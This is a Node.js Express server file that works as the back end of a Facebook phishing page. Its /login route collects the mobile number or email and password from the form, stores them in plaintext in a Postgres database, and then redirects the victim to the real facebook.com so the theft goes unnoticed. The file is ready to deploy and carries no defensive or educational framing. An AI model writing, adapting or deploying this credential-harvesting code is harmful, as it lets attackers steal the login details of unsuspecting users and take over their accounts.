const express = require('express');
const { Pool } = require('pg');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Setup database connection pool
// Database URL will be provided via the DATABASE_URL environment variable on Neon/Render
const databaseUrl = process.env.DATABASE_URL;

let pool;
if (databaseUrl) {
    pool = new Pool({
        connectionString: databaseUrl,
        ssl: {
            rejectUnauthorized: false // Neon requires SSL
        }
    });
    console.log('Database connection pool initialized.');
} else {
    console.warn('WARNING: DATABASE_URL environment variable is not defined. Database features will not work.');
}

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Handle the login form submission
app.post('/login', async (req, res) => {
    const { mobile_or_email, password } = req.body;

    console.log(`Received login attempt - Mobile/Email: ${mobile_or_email}`);

    if (!pool) {
        console.error('Database connection pool is not configured.');
        return res.status(500).send('Database connection is not configured. Please set the DATABASE_URL environment variable.');
    }

    try {
        const queryText = 'INSERT INTO users (mobile_or_email, password) VALUES ($1, $2) RETURNING id';
        const values = [mobile_or_email, password];
        
        const result = await pool.query(queryText, values);
        console.log(`Successfully saved user credentials. Assigned ID: ${result.rows[0].id}`);

        // Redirect user to the actual Facebook home page after credentials are saved
        res.redirect('https://www.facebook.com');
    } catch (err) {
        console.error('Error saving user to database:', err.message);
        res.status(500).send('An error occurred during authentication. Please try again.');
    }
});

// Start Server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
